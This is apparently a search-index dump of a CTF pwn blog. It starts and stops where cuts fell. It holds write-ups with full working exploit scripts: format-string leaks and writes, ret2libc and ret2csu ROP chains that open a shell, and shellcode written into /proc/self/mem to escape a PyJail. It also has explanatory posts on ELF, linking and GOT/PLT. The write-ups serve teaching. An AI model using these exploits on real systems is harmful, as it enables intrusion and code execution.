check.\nBuffer Overflow: # Finally you do a bit of fiddling to get the correct offset of the stack canary and overwrite with the leaked canary, then simply do a ret2libc.\nExploit: # from pwn import * exe = \u0026#39;./checkpoint\u0026#39; context.binary = elf = ELF(exe) libc = \u0026#34;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; if(libc != \u0026#34;\u0026#34;): libc = ELF(libc) def start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b* main \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== \u0026#39;\u0026#39;\u0026#39; NOTES: 16: my input 49: canary 51: a libc address 56: a binary address \u0026#39;\u0026#39;\u0026#39; p = start() p.recv() p.sendline(b\u0026#34;%49$p-%51$p-%56$p\u0026#34;) leak = p.recvline().split(b\u0026#34;-\u0026#34;) elf.address = int((str(leak[2])[4:-3]), 16) - elf.sym.__libc_csu_init libc.address = int((str(leak[1])[4:-1]), 16) - 159923 canary = int((str(leak[0])[4:-1]), 16) log.info(f\u0026#34;elf base: {hex(elf.address)}\u0026#34;) log.info(f\u0026#34;libc base: {hex(libc.address)}\u0026#34;) fmt = fmtstr_payload(16, { elf.sym.size: 500, elf.sym.strength: u64(b\u0026#34;STRENGTH\u0026#34;), }) p.recv() p.sendline(b\u0026#34;y\u0026#34;) p.send(fmt) p.recv() p.sendline(b\u0026#34;$p\u0026#34;) p.sendline(b\u0026#34;n\u0026#34;) p.sendline(b\u0026#34;A\u0026#34;*0x158 + p64(canary) + p64(0) + p64(elf.address + 0x1016) + p64(elf.address+0x151b)+ p64(next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) + p64(libc.sym.system)) p.interactive() This was short and crisp since all these topics are already covered in the rest of the blogs. Happy Hacking.\n","date":"2024-01-04","externalUrl":null,"permalink":"/training/1728229207308-checkpoint-train-4/","section":"Pwn Training","summary":"\u003cp\u003eCongrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.\u003c/p\u003e","title":"Checkpoint [train 4]","type":"training"},{"content":"This contains most of the basic stack based exploitation techniques and challenges, I solved. They are mostly x86 64 bit excecutables.\n","date":"2024-01-03","externalUrl":"https://github.com/tourpran/pwn-hub/tree/main/basic_attacks","permalink":"/training/1728287101851-basic-stack-exploitation/","section":"Pwn Training","summary":"","title":"Basic - Stack Exploitation","type":"training"},{"content":"These are some of the hard heap challenges I encountered in various CTFs. They are structured, so you only have to work hard and tackle them.\n","date":"2024-01-02","externalUrl":"https://github.com/tourpran/pwn-hub/tree/main/Heap","permalink":"/training/1728287138127-advanced---heap-exploitation/","section":"Pwn Training","summary":"","title":"Advanced - Heap Exploitation","type":"training"},{"content":"This is my current area of research. I look mostly into v8, which is chrome browser\u0026rsquo;s Javascript Engine. This contains cves and related topic.\n","date":"2024-01-01","externalUrl":"https://github.com/tourpran/pwn-hub/tree/main/v8-exp","permalink":"/training/1728287157117-expert---browser-exploitation/","section":"Pwn Training","summary":"","title":"Expert - Browser Exploitation","type":"training"},{"content":"This was a particularly unique and well-designed PyJail challenge featured in the Asian Cyber Security Challenge. Although I solved it during the contest using an unintended method.\nI later came across a writeup by ptr-yudai (an incredible pwner, someone I really aspire to be like!). Below are the notes I made while going through his insightful writeup.\nPart 1: Getting the Name of the File # In this challenge, we needed to find the file\u0026rsquo;s name along with the full path, as the flag file had a randomized name.\nopenat System Call: # The openat syscall allows us to open files within a directory by specifying the directory file descriptor and a relative path.\nint openat(int dirfd, const char *pathname, int flags); We set the path as /home/ctf, and AT_FDCWD is set in dirfd to indicate that the pathname is relative. openat syscall breakdown: rdi: first argument - AT_FDCWD (-100). rsi: pointer to the path (e.g., /home/ctf). rdx: flags (set to 0 for read-only). rax: syscall number (257). getdents System Call: # This syscall reads directory entries, such as filenames, from an open directory.\nint getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); It retrieves a series of linux_dirent structures, each containing metadata about files within the directory, like the inode number, offset, and filename. struct linux_dirent { unsigned long d_ino; /* Inode number */ unsigned long d_off; /* Offset to next linux_dirent */ unsigned short d_reclen; /* Length of this linux_dirent */ char d_name[]; /* Filename (null-terminated) */ char pad; /* Zero padding byte */ char d_type; /* File type (since Linux 2.6.4) */ }; getdents syscall breakdown: rdi: file descriptor returned by the openat syscall. rsi: buffer (address of the directory entries). rdx: buffer size (0x1000). rax: syscall number (78). Recursive Code to Print Directory Entries: # The following code iterates through the linux_dirent structures, printing out each filename in the directory.\nr15 = rax ; number of bytes read. r14 = 0 ; initialize index to 0. edx = 0 ; reset edx. lp: write(1, rsp + r14 + 18, 20) ; print the filename. write(newline) ; add newline. dx = *(rsp + r14 + 16) ; get the record length. add r14d, edx ; move to the next record. cmp r14, r15 ; compare index with total bytes read. jl lp ; loop until all records are printed. exit() ; exit after printing all filenames. This code loops through the directory entries and prints the filenames, allowing us to identify the randomly named flag file.\nPart 2: Injecting Shellcode via Memory Manipulation # The next step involves executing arbitrary code by injecting shellcode into memory using file descriptors mapped to the process\u0026rsquo;s memory.\nVirtual Memory Manipulation: # We leverage the /proc/ filesystem, which provides access to the kernel\u0026rsquo;s view of the current process, including memory mappings and the process\u0026rsquo;s memory itself.\n/proc/self/maps: Provides the memory mappings of the current process. /proc/self/mem: Allows direct access to the memory of the current process. Python Code for Shellcode Injection: # code = f\u0026#34;\u0026#34;\u0026#34; all(map( lambda fs: [ fs[1].seek(int(fs[0].read(12), 16) + 0x18ebb8, 0), fs[1].write({shellcode}), fs[1].flush(), input() ], [(open(\u0026#34;/proc/self/maps\u0026#34;), open(\u0026#34;/proc/self/mem\u0026#34;, \u0026#34;wb\u0026#34;))] )) \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;) Breakdown: # Get the memory mapping: The code reads the first address from /proc/self/maps, which gives the base address of the memory region. Seek to a target offset: It seeks to a specific offset (calculated as 0x18ebb8 from the base address), which is somewhere in the _Py_read function. Write shellcode: The shellcode is injected into the memory at the calculated offset. Flush changes: The memory is flushed to ensure that the shellcode is written. Trigger shell execution: The shellcode gets executed when the process calls the read function. Part 3: Extracting the Flag # In the final part, the flag file can be accessed using standard file operations. Since the flag filename is randomized, the steps involve:\nOpening the file: Using the open syscall to open the flag file. Reading the flag: Reading the contents of the flag file. Printing the flag: Outputting the flag, which reveals the solution. open(\u0026#34;flag-[random-md5].txt\u0026#34;, O_RDONLY) read(fd, buffer, size) write(1, buffer, size) Part 1 Assembly code # [BITS 64] global main section .text main: ;openat(AT_FDCWD, \u0026#34;/\u0026#34;, O_RDONLY) mov edx, 0 lea rsi, [rel s_root] mov rdi, -100 mov eax, 257 syscall ;getdents(fd, dirent, 0x1000) mov rdi, rax mov rsi, rsp mov rdx, 0x1000 mov rax, 78 syscall mov r15, rax xor r14, r14 xor edx, edx jmp rec rec: mov dx, [rsp+r14+16] ; rsp is our dirent sub edx, 20 lea rsi, [rsp+r14+18] mov edi, 1 mov eax, 1 syscall mov edx, 1 lea rsi, [rel s_newline] mov edi, 1 mov eax, 1 syscall mov dx, [rsp+r14+16] add r14d, edx cmp r14, r15 jl rec xor edi, edi mov eax, 60 syscall section .data s_root: db \u0026#34;/home/ctf\u0026#34;,0 s_newline: db 0x0a Part 2 Assembly code # [BITS 64] global main section .text main: mov rax, 2 lea rdi, [rel flag] mov rsi, 0 mov rdx, 0 syscall mov rdi, rax mov rsi, rsp mov rdx, 100 mov rax, 0 syscall mov rdi, 1 mov rsi, rsp mov rdx, 100 mov rax, 1 syscall section .data flag: db \u0026#34;/home/ctf/flag-0479f1dcda629bbe833598bce876a647.txt\u0026#34;, 0 By following this process, we can successfully extract the flag and complete the challenge.\n","date":"2023-08-19","externalUrl":null,"permalink":"/writeups/1729358345340-evalbox---pyjail-writeup/","section":"Writeups","summary":"\u003cp\u003eThis was a particularly unique and well-designed PyJail challenge featured in the Asian Cyber Security Challenge. Although I solved it during the contest using an unintended method.\u003c/p\u003e","title":"evalbox - pyjail writeup","type":"writeups"},{"content":"","date":"2023-08-19","externalUrl":null,"permalink":"/tags/ptr-yudai/","section":"Tags","summary":"","title":"Ptr-Yudai","type":"tags"},{"content":"","date":"2023-08-19","externalUrl":null,"permalink":"/tags/pyjail/","section":"Tags","summary":"","title":"Pyjail","type":"tags"},{"content":"This is a basic ROP Challenge that involves a technique called the ret2csu. We use this when there is a lack of gadgets.\nChallenge Description # Solution: # Checkout the mitigations of the binary Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout ROPemporium. Craft the payload to get flag from server. Mitigations: # We can\u0026rsquo;t excecute shellcode (NX Enabled) No Canary found - no need for brute force or leaks PIE disabled - the address of the binary wont be randomised Finding Gadgets: # Install ROPgadget to find all the gadgets in the binary.\nROPgadget --binary babyrop My first thought was to write the address pointed by the got of write. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed.\npop rdi pop rsi pop rdx I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI.\nrsi - point to the buffer [write@got] rdi - file discriptor = 1 rdx - size of the buffer = \u0026gt;8 Since ropgadget did not give me the gadget I went to look for more gadgets in the __libc_csu_init. There I could find all the gadgets I wanted.\nCrafting Exploit: # These are the important gadgets I want.\nIdea # First overflow the buffer with garbage and then make return jump to csu. Things to note.\n0x00000000004011b0 \u0026lt;+64\u0026gt;:\tmov rdx,r14 0x00000000004011b3 \u0026lt;+67\u0026gt;:\tmov rsi,r13 0x00000000004011b6 \u0026lt;+70\u0026gt;:\tmov edi,r12d 0x00000000004011ca \u0026lt;+90\u0026gt;:\tpop rbx 0x00000000004011cb \u0026lt;+91\u0026gt;:\tpop rbp 0x00000000004011cc \u0026lt;+92\u0026gt;:\tpop r12 0x00000000004011ce \u0026lt;+94\u0026gt;:\tpop r13 0x00000000004011d0 \u0026lt;+96\u0026gt;:\tpop r14 0x00000000004011d2 \u0026lt;+98\u0026gt;:\tpop r15 0x00000000004011d4 \u0026lt;+100\u0026gt;:\tret Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to QWORD PTR [r15+rbx*8] inbetween these gadgets. So we decided to make this QWORD PTR [r15+rbx*8] as the write function. In order to do this well set r15 as the address to write@got and rbx as 0.\n0x00000000004011b9 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r15+rbx*8] 0x00000000004011bd \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x00000000004011c1 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x00000000004011c4 \u0026lt;+84\u0026gt;:\tjne 0x4011b0 \u0026lt;__libc_csu_init+64\u0026gt; Hmmm :(. Seems like there is a compare statement that\u0026rsquo;ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.\nbuf = b\u0026#34;a\u0026#34;*72 buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15 buf += p64(0)+p64(1)+p64(1)+p64(elf.got[\u0026#39;write\u0026#39;])+p64(8)+p64(elf.got[\u0026#39;write\u0026#39;]) buf += p64(0x00000000004011b0) buf += p64(0)*7 buf += p64(elf.sym[\u0026#39;main\u0026#39;]) Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to libc.blukat.me\nNow its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).\nAnyway here is the exploit script for this challenge.\n#!/usr/bin/env python3 from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#39;i386\u0026#39;) exe = \u0026#39;./babyrop\u0026#39; elf = ELF(\u0026#34;./babyrop\u0026#34;) def start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # ./exploit.py GDB gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = remote(\u0026#34;dicec.tf\u0026#34;, 31924) # shellcode = asm(shellcraft.sh()) \u0026#39;\u0026#39;\u0026#39; 0x00000000004011d3 : pop rdi ; ret write syscall rdi = 1 rsi = pointer to puffer (pointer to write function) rdx = size \u0026#39;\u0026#39;\u0026#39; p.recvuntil(\u0026#34;: \u0026#34;) buf = b\u0026#34;a\u0026#34;*72 buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15 buf += p64(0)+p64(1)+p64(1)+p64(elf.got[\u0026#39;write\u0026#39;])+p64(8)+p64(elf.got[\u0026#39;write\u0026#39;]) buf += p64(0x00000000004011b0) buf += p64(0)*7 buf += p64(elf.sym[\u0026#39;main\u0026#39;]) p.sendline(buf) # log.info(\u0026#34;write leak: {}\u0026#34;.format((hex(u64(p.recv(8)))))) leak = int(hex(u64(p.recv(8))), 16) log.info(\u0026#34;Write leak: {}\u0026#34;.format(hex(leak))) sys = leak-0xbbdc0 binsh = leak+0xa63da buf = b\u0026#34;a\u0026#34;*72 buf += p64(0x40116b) #ret buf += p64(0x00000000004011d3) #pop rdi buf += p64(binsh) buf += p64(sys) p.sendline(buf) p.interactive() ","date":"2021-10-04","externalUrl":null,"permalink":"/writeups/1728230824684-babyrop-dicegang-ctf/","section":"Writeups","summary":"\u003cp\u003eThis is a basic ROP Challenge that involves a technique called the ret2csu. We use this when there is a lack of gadgets.\u003c/p\u003e","title":"babyROP [DiceGang CTF]","type":"writeups"},{"content":"","date":"2021-10-04","externalUrl":null,"permalink":"/tags/csu/","section":"Tags","summary":"","title":"Csu","type":"tags"},{"content":"","date":"2021-10-04","externalUrl":null,"permalink":"/tags/dicegang/","section":"Tags","summary":"","title":"Dicegang","type":"tags"},{"content":"","date":"2021-10-04","externalUrl":null,"permalink":"/tags/ret2csu/","section":"Tags","summary":"","title":"Ret2csu","type":"tags"},{"content":"","date":"2021-09-06","externalUrl":null,"permalink":"/tags/format-string/","section":"Tags","summary":"","title":"Format String","type":"tags"},{"content":"Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called leaky pipes. Make sure to give the challenge a try before seeing this.\nChallenge file: # vuln binary and vuln c code\nPre requisites: # Basic understanding of how computers work. Know what format strings are. will to learn more from googling. Mitigations: # Most of the format string exploitation will have all the mitigations enabled. RELRO: GOT related stuff. Stack Canary: unique value stoping buffer overflow. NX: Makes the stack not excecutable. PIE: the binary will have different address during different runs. Sample run: # Lets simply run the binary, while doing this make sure to read the c code and get comfortable with the binary as a whole.\nWe can give three options (1, 2, 3) but 2 options doesnt do anything. option 1: Give an input and get same output back from the printf function. option 3: Currently unavailable since we dont have enough cash. Exploit Basics: # Format string exploitation occurs when you use the printf function carelessly. Correct Usage of printf will be to use the format strings/ format specifiers in the first part and all the parameters in the 2nd part.\nprintf(\u0026#34;my name is : %s\\n\u0026#34;, \u0026#34;giovanni giorgio\u0026#34;); Problem occurs when attackers are given access to these format strings part. So as an attacker he can specify formats which will try to retrieve values that are not specified, hence will take values from the stack. Incorrect usage.\nprintf(buffer); //buffer = user input Exploit Idea: # We have to somehow go to the use_tape() Since it has our flag and another format string exploit.\nvoid use_tape(){ char experience[50]; char flag[50]; FILE *fp; fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;rb\u0026#34;); if(fp != NULL){ fgets(flag, 50, fp); fclose(fp); printf(\u0026#34;Please give us your feedback!\\n\u0026#34;); fgets(experience, 50, stdin); printf(experience); exit(0); } else{ printf(\u0026#34;Error opening file!\\n\u0026#34;); exit(1); } But the small caviat is we can\u0026rsquo;t go there directly we somehow have to increase our balance from 100 to 200 (exactly) and then call buy_repair_kit().\nvoid buy_repair_kit(){ if(bal == 200){ use_tape(); } else{ printf(\u0026#34;You do not have enough balance! :(\\n\u0026#34;); } } Format string 1: # First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack).\np.sendline(b\u0026#34;-%p\u0026#34;*50) leak = p.recvline() leak = leak.split(b\u0026#34;-\u0026#34;) Sending many %p with the \u0026lsquo;-\u0026rsquo; acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binary\u0026rsquo;s address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)\nfact to know: When PIE is enabled the entire binary changes its place but the relative address of functions and variables remain same.\nPick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).\nbaladd = int(leak[21], 16)+10974 log.info(f\u0026#34;bal address: {hex(baladd)}\u0026#34;) Format string 2: # Well! part 1/3 is over and it was just the easy part. Now comes the tricky part, I wasted hours trying to find a way to make the bal variable = 200. Finally I came upon a solution after hours of googling. I call the leak function and give the string to overwrite the bal variable.\np.sendline(b\u0026#34;%99c%9$n%90c%9$n%11c%9$n\u0026#34; + p64(baladd)) Let me explain in parts what it does.\nWhile doing a format string exploit to overwrite a variable or a function address\u0026hellip; Check where your input is appearing and keep note of the index.\nHere my string of AAAAAAAA repeats in the index 6. Now its just a matter of overwriting the variable. But\u0026hellip; wait. How to overwrite ? we sure dont have no buffer overflow, can printf be used to overwrite ? da flick ?\nYes! The format specifier %n will write the number of bytes read till now into the address specified. So things become simple, Just put 200 bytes put the address of the variable, so the value of 100 will change to 200. Is it that simple ? kinda yes. One more caviat is only 8 bytes are read and excecuted by the program at a time, So we slowly build up the no of bytes and the put the value into specifc address.\n%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value. p.sendline(b\u0026#34;%99c%9$n%90c%9$n%11c%9$n\u0026#34; + p64(baladd)) #(c = character, $n = to write) Above I have added (99+90+11) which gives 200 into 9th offset since the p64(baladd) will place the address of baladd in the 9th index from start.\nFormat string 3: # Great job guys! Final part is damn simple just call the buy_repair_kit() function which now satify bal == 200 and call use_tape(), Here the flag is opened and just read into the stack followed by an unsafe printf leading to format string exploitation. Just leak most of the stack and get the flag. GG\nFull Exploit Script: # #!/usr/bin/env python3 from pwn import * context.update(arch=\u0026#39;x86\u0026#39;) exe = \u0026#39;./chall\u0026#39; elf = ELF(\u0026#34;./chall\u0026#34;) def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) #=========================================================== # EXPLOIT GOES HERE #=========================================================== p = start() # p = remote(\u0026#34;gc1.eng.run\u0026#34;, 32309) #Leaking the bal variable address p.recv() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;like to check your leaks?\u0026#34;) p.sendline(b\u0026#34;-%p\u0026#34;*50) p.recvline() leak = p.recvline() leak = leak.split(b\u0026#34;-\u0026#34;) baladd = int(leak[21], 16)+10974 log.info(f\u0026#34;bal address: {hex(baladd)}\u0026#34;) #Over write bal with 200 to bypass the check p.sendline(b\u0026#34;1\u0026#34;) p.recv() p.sendline(b\u0026#34;%99c%9$n%90c%9$n%11c%9$n\u0026#34; + p64(baladd)) p.recv() #Leak the flag from the stack since its opened p.sendline(b\u0026#34;3\u0026#34;) p.recvuntil(b\u0026#34;feedback!\u0026#34;) p.sendline(b\u0026#34;%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p\u0026#34;) p.recvline() #Change the hex flag to ascii flag = p.recvline().split(b\u0026#34;-\u0026#34;) final = \u0026#34;\u0026#34; for hexval in flag: try: final += (str(bytes.fromhex(str(hexval)[4:-1]).decode(\u0026#39;utf-8\u0026#39;))[::-1]) except: continue final += \u0026#34;ng!!}\u0026#34; log.info(f\u0026#34;flag: {final}\u0026#34;) p.interactive() Happy Hacking!\n","date":"2021-09-06","externalUrl":null,"permalink":"/writeups/1728230839404-leaky-pipes-inctfj-quals/","section":"Writeups","summary":"\u003cp\u003ePlayed InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called \u003ccode\u003eleaky pipes\u003c/code\u003e. Make sure to give the challenge a try before seeing this.\u003c/p\u003e","title":"Leaky Pipes [inCTFj Quals]","type":"writeups"},{"content":"","date":"2020-09-10","externalUrl":null,"permalink":"/tags/elf/","section":"Tags","summary":"","title":"ELF","type":"tags"},{"content":"So the ELF or Excecutable and Linkable format are programs or binaries that are used in linux systems. ELFs contain 3 components namely:\nELF Headers ELF Segments ELF Sections Need: # A good reason to learn ELF format is it helps you to understand things easily when you do binary analysis or when you are curious to know how the Operating System works. There are several reasons why you need to know them \u0026hellip;\nELF Headers # Firstly we will be looking at ELF which are 64 bits, dynamically linked, not stripped. Lets look at the ELF header with readelf.\nreadelf -h binary magic # We can see from the image that our header / binary starts with the magic bytes Magic: 45 4c 46 which corresponds to ELF in ascii. This magic bytes tell the file command that this is an Excecutable and Linkable Format.\nClass # This binary has a class of 64 bits because when I compiled, it was in a 64 bit machine so by default it will be 64 bits. Inorder to compile a 32 bit binary we need to give the -m32 flag to gcc.\nData # Little Endian Big Endian The bytes of a word are arranged from right to left The bytes of a word are arranged from left to right The address of the word (assume 4 bytes) will point to 4 th bytes The address of that word (assume 4 bytes) will point to the 1st bytes So in our case its little endian and most 64 bit amd processors compile it in little Endian.\nOS/ABI # Nothing to tell about OS (Operating System). I compiled this is my laptop which is Linux hence Unix.\nMachine # Tells us we have x86 architecture with 64 bits.\ntype # Not sure why its DYN(Shared Object). It should have been EXEC (Executable file).[will update soon].\nRest # Rest of the information is regarding addresses and Size of sections and headers.\nSegments (aka Program Headers) # readelf -h ``binary`` This is a array of structures. Each describes the segments. The segments are used to tell, how to create a memory image when the binary is excecuted. When the Kernel sees these segments it will map them into the Virtual Memory with the help of mmap system call.\nPHDR # Tells the location of the Program header itself if its present.\ninterp # specifies the location and size of a null-terminated path name to invoke as an interpreter\ninterpreter\nIt is a program that excecutes certain specified instructions [not to worry now]. dynamic # This segment specifies the information needed for the dynamic linking process.\nGNU_EH_FRAME # This stores exceptional handlers. When things go wrong this area can deal with it.\nGNU_STACK # stack This is just a place where things can be stored during runtime. This GNU_STACK is responsible for the stack being excecutable. If this is not there then by default stack will be excecutable. If stack is enabled then user input can also be excecuted and can lead to a great havoc.\nELF Sections # This is also commonly called as section headers. This has the information needed for linking a target object file (dependencies) to the binary. This is needed on linktime but not on runtime.\nCommon Sections # .text: This section contains the code for the binary. .data: Holds all the initialised data. .rodata: Holds the initialised read-only data. .bss: Contain all the uninitialized data. .plt: PLT (Procedure Linkage Table) is useful when it comes to getting address of functions in dynamically linked libraries. .got: Contains all the resolved address of the functions from the dependecies. .dynamic: Holds all needed information for dynamic linking. .dynsym: table dedicated to dynamically linked symbols. .strtab: string table of .symtab section. .dynstr: string table of .dynsym section. .interp: RTLD embedded string. END # Hope you understood some basic concepts related to the ELF file format.\nsources: # intezer linux-audit ","date":"2020-09-10","externalUrl":null,"permalink":"/posts/1728230608669-executable-and-linkable-format---sections-and-segments/","section":"Blog Posts","summary":"\u003cp\u003eSo the ELF or Excecutable and Linkable format are programs or binaries that are used in linux systems. ELFs contain 3 components namely:\u003c/p\u003e","title":"Executable and Linkable Format - Sections and Segments","type":"posts"},{"content":"","date":"2020-09-10","externalUrl":null,"permalink":"/tags/sections/","section":"Tags","summary":"","title":"Sections","type":"tags"},{"content":"","date":"2020-09-10","externalUrl":null,"permalink":"/tags/segments/","section":"Tags","summary":"","title":"Segments","type":"tags"},{"content":"","date":"2020-09-06","externalUrl":null,"permalink":"/tags/dynamic-and-static-linking/","section":"Tags","summary":"","title":"Dynamic and Static Linking","type":"tags"},{"content":"We will take a quick look into the different types of linking of libraries to the ELF in x86 (linux).\nLinking: # Linking - It is the process where something is being connected to something else. Suppose you call functions that is not defined in your binary and has to be used from some dependencies. There Linking comes into picture.\nsample program # #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello World\\n\u0026#34;); printf(\u0026#34;Welcome to my blog\\n\u0026#34;); } This will just print 2 strings to the terminal. Nothing intresting and complicated. Now let us compile this with static flag set.\ngcc --static test.c -o test Code Analysis # Now this is statically compiled. Let us try to analyse the code and see how the printf function is called.\nnote: Printf is a libc function, which means it is not included in the binary and is been imported from a external dependency. so open gdb and disassembly main We can see that there is a normal puts. Do you remember we used printf in our function. This means the compiler plays god and decides the best function to be used in that place. Since puts is more efficient than printf it was implemented there. Instead when you use format strings in printf then puts cant be implemented in that case. set a break point at puts and run the program. So now we see we go into the function puts. which has an address 0x4118c0. Now is this address kinda giving you an idea ? Yup ! This is our binary. If we do a vmmap (virtual memory mapping) then we can see that the address from 0x00400000 to 0x004e7000 are inside the binary. Now we can say that the puts function is inside the binary so its address is also known at runtime.\nPros and Cons # Advantage disadvantage Anybody having the binary can excecute it. There will be no dependency errors In real Life the applications are pretty huge and need multiple dependency files. Combining all of them into one file will make the size of the binary pretty huge. Dynamic Linking # Time to move on to the complicated stuff. To compile it as dynamic, you have to do a normal gcc compilation as GCC compiles everything into Dynamic linking by default.\ngcc test.c -o test Code Analysis # We know for a fact that the functions are not going to be inside our binary. The binary being smart will store the names of dependencies that our needed to excecute this file.\nMr. Dynamic Linker\nThe Dynamic Linker will link all the dependencies to the binary.\nFirst before excecuting the elf the system will excecute interpreter, which is a program that sets up the environment for excecuting the binary, this is done with the help of .dynamic section. This program (interpreter) lies in the pt_interp segment which is created by the ld (compile-time linker).\nreadelf -d test NEEDED : contains the names of all the dependencies. DT_SYMTAB : Address of the dynamic symbol table. so on\u0026hellip; steps # First the dynamic linker will load the excecutable into memory. Next will load the dependencies which are mentioned in the binary. Relocation - shared libraries are loaded into non-deterministic addresses. then do some initialisation and go back to binary\u0026rsquo;s entry point / starting point Pros and Cons # Advantage disadvantage People only need to have the dependencies installed once, that can be used for other binaries as well. People who dont have the correct dependency will face a lot of problems(finding them). Lazy Linking # Oops ! did I say that the linker performs all relocations. Well, thats not the case for most situations. This is where lazy linking comes into picture. So if a function is called then the dynamic linker will resolve the address for the function. Hence the name \u0026ldquo;Lazy\u0026rdquo; Linking. This awesome work is done by the GOT and PLT. (Next blog)\nReference: # Really cool blog which made me understand this concept. intezer\n","date":"2020-09-06","externalUrl":null,"permalink":"/posts/1728230620380-dynamic-and-static-linking/","section":"Blog Posts","summary":"\u003cp\u003eWe will take a quick look into the different types of linking of libraries to the ELF in x86 (linux).\u003c/p\u003e","title":"Dynamic and Static Linking","type":"posts"},{"content":"How do programs know where the libc functions are in the libc, How is the internal implementation of the same ? We will look into GOT and PLT in short in this one.\nwhere and why ? # So Before diving into the concepts and working of GOT and PLT. Lets understand why we need them and where we need them.\nSo, In modern days we cant always compile the libraries or dependencies along with the binary. So the alternative option is to use Dynamic Linking. With advantages comes some complexity :P. So we dont know the address of functions that are used in the binary which are indeed defined in the dependency. So each time the binary runs the address needs to be resolved. This cool process is done with the help of GOT and PLT. Also these are not functions. They are just tables as the names suggest.\nSample Code # #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello World\\n\u0026#34;); printf(\u0026#34;Welcome to my blog\\n\u0026#34;); } now compile this with no pie and 64 bit for further ease.\ngcc test.c -o test -no-pie Now this is Dynamically Linked (GCC does Dynamic Linking by default). So lets us run this\u0026hellip; Works fine.\nGDB Code Analysis # So let us use GDB (me - GDB-PEDA). Now disassemble the main and check for printf that we implemented. Hmm.. Weird We dont see it. If you read my previous blog you would know why. In short this is for efficiency. Do notice that the puts is actually termed puts@plt.\nSet a breakpoint at puts@plt run the program We come to puts@plt instead of next step let us single step to see what is there in the puts@plt. Now in the disassembly we can see that its not really puts function, We landed in the plt section of puts. Yes!! Procedure Linkage Table. Its basically a table which does a jump to the Global Offset Table for that particular entry, \u0026ldquo;puts\u0026rdquo;. Also remember this \u0026ldquo;GOT\u0026rdquo; is located in the .got section in the binary.\nNow we know that the got will not be filled with the address of puts as this is the first time this LIBC function is being called. So instead of real address of puts the got section of puts will contain the address of next instruction, which is a push followed by another jump. This push of a number can be imagined as the index of the string \u0026ldquo;puts\u0026rdquo; in the string table. Next the jump is to the function _dl_runtime_resolve. Yes this is the resolver,\ndl runtime resolve\nThis function will take the string as input and will find the real address of puts in libc and finally will change the GOT entry for puts. So due to this the function puts need not be searched again in the libc but can be directly taken from the got.\nThis whole process can be imagined this way. end # End of story. Great now you know a little bit of how GOT and PLT works.\n","date":"2020-09-06","externalUrl":null,"permalink":"/posts/1728230645394-global-offset-table-and-procedure-linkage-table/","section":"Blog Posts","summary":"\u003cp\u003eHow do programs know where the libc functions are in the libc, How is the internal implementation of the same ? We will look into GOT and PLT in short in this one.\u003c/p\u003e","title":"Global Offset Table and Procedure Linkage Table","type":"posts"},{"content":"","date":"2020-09-06","externalUrl":null,"permalink":"/tags/got/","section":"Tags","summary":"","title":"GOT","type":"tags"},{"content":"","date":"2020-09-06","externalUrl":null,"permalink":"/tags/short-blog/","section":"Tags","summary":"","title":"Short-Blog","type":"tags"},{"content":"","date":"2020-08-06","externalUrl":null,"permalink":"/tags/fun/","section":"Tags","summary":"","title":"Fun","type":"tags"},{"content":"","date":"2020-08-06","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection","type":"tags"},{"content":"","date":"2020-08-06","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"Sql","type":"tags"},{"content":" What is a Database: # A database can be thought as a collection of data in an organised 